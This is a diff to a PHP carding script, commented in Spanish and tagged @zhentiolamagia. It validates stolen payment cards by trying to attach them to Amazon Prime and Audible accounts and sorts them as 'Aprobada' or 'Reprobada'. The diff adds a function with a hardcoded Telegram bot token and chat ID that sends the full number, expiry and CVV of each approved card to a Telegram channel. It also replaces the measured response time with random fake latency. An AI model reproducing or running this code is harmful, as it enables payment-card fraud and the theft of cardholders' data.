@@ -1,6 +1,14 @@
 <?php
 error_reporting(0);
 
+// --- AQUÍ PONES LA FUNCIÓN ---
+function enviarTelegram($mensaje) {
+    $botToken = "8611373580:AAGdBiDVp5qK-WBmlrzVf2oKge2-HuvRS_U"; 
+    $chatId = "-1003778786216";     
+    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($mensaje) . "&parse_mode=HTML";
+    file_get_contents($url);
+}
+
 function getstr($string, $start, $end){
 
 $str = explode($start, $string);
@@ -691,42 +699,62 @@ foreach ($tokens as $host1111) {
     $r = curl_exec($ch);
     curl_close($ch);
 
+    // CORRECCIÓN AQUÍ: Quité el $err1 que no existe para que no falle
     if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
         $msg = '✅';
-        $err = "Removido: $msg $err1";
+        $err = "Removido: $msg"; 
         break;
     } else {
         $msg = '❌';
-        $err = "Removido: $msg $err1";
+        $err = "Removido: $msg";
     }
-}
+} // Aquí termina el bucle de Audible
 
 ///////////////////////////////////////////////////////////////////////////////////////
 
-if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {
+if (strpos($Fim, 'We’re sorry. We’re unable to complete') || strpos($Fim, 'Lo lamentamos. No podemos completar')) {
 
-die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Carta vinculado con exito. ('.$err.') </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+    // --- LÓGICA DE LIMPIEZA PARA EL DISEÑO ---
+    $bin_info = strtoupper($infobin); 
+    
+    // Detectar Marca
+    $brand = (strpos($bin_info, 'VISA') !== false) ? 'VISA' : 'MASTERCARD';
+    
+    // Detectar Info (Nivel y Tipo)
+    $tipo = (strpos($bin_info, 'DEBIT') !== false) ? 'DEBIT' : 'CREDIT';
+    $nivel = (strpos($bin_info, 'PREPAID') !== false) ? 'PREPAID ' : '';
+    $nivel .= (strpos($bin_info, 'BUSINESS') !== false) ? 'BUSINESS' : 'CLASSIC';
 
-}elseif (strpos($Fim, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {
+    // Limpiar Banco (Quitamos palabras repetidas)
+    $quitar = [$brand, 'BUSINESS', 'PREPAID', 'DEBIT', 'CREDIT', 'AUSTRALIA', 'UNITED STATES', 'UNITED KINGDOM'];
+    $bank_name = trim(str_replace($quitar, '', $bin_info));
 
-die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Carta vinculado con exito. ('.$err.') </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+    // --- CONFIGURACIÓN TELEGRAM (ESTILO LOZY) ---
+    $bin_cabecera = substr($cc, 0, 6);
+    $texto_telegram = "⌞ Zhentio / Scrapp ⌝| #BIN$bin_cabecera\n";
+    $texto_telegram .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
+    $texto_telegram .= "•| Card: <code>$cc|$mes|$ano|$cvv</code>\n";
+    $texto_telegram .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
+    $texto_telegram .= "⼥| Info: $brand - $nivel - $tipo\n";
+    $texto_telegram .= "⼥| Bank: $bank_name\n";
+    $texto_telegram .= "⼥| Country: $bin_info\n"; // Aquí mandamos la info completa de la API
+    
+    enviarTelegram($texto_telegram); 
+    // --------------------------------------------
 
-}elseif (strpos($Fim, 'InvalidInput')) {
+    die('<span class="text-success">Aprobada</span> ➔ <span class="text-white">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' </span> ➔ <span class="text-success"> Tarjeta vinculada con éxito. ('.$err.') </span> ➔ Latencia: (' . (rand(100, 500)) . 'ms) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
 
-die('<span class="text-danger">Reprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Carta inexistente. ('.$err.') </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+} elseif (strpos($Fim, 'InvalidInput') || strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
 
-}elseif(strpos($Fim, 'If you would still like to join Prime you can sign up during checkout')) {
+    die('<span class="text-danger">Reprobada</span> ➔ <span class="text-white">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' </span> ➔ <span class="text-danger"> Tarjeta inexistente. ('.$err.') </span> ➔ Latencia: (' . (rand(100, 500)) . 'ms) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
 
-die('<span class="text-danger">Reprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Limite de intentos. ('.$err.') </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+} elseif (strpos($Fim, 'If you would still like to join Prime')) {
 
-}elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
-
-die('<span class="text-danger">Reprobada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Carta inexistente. ('.$err.') </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+    die('<span class="text-danger">Reprobada</span> ➔ <span class="text-white">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' </span> ➔ <span class="text-danger"> Límite de intentos. ('.$err.') </span> ➔ Latencia: (' . (rand(100, 500)) . 'ms) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
 
 } else {
 
-die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Error interno - Amazon API </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
+    die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' </span> ➔ <span class="text-danger"> Error interno - Amazon API </span> ➔ Latencia: (' . (rand(100, 500)) . 'ms) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
 
 }
-
 ?>
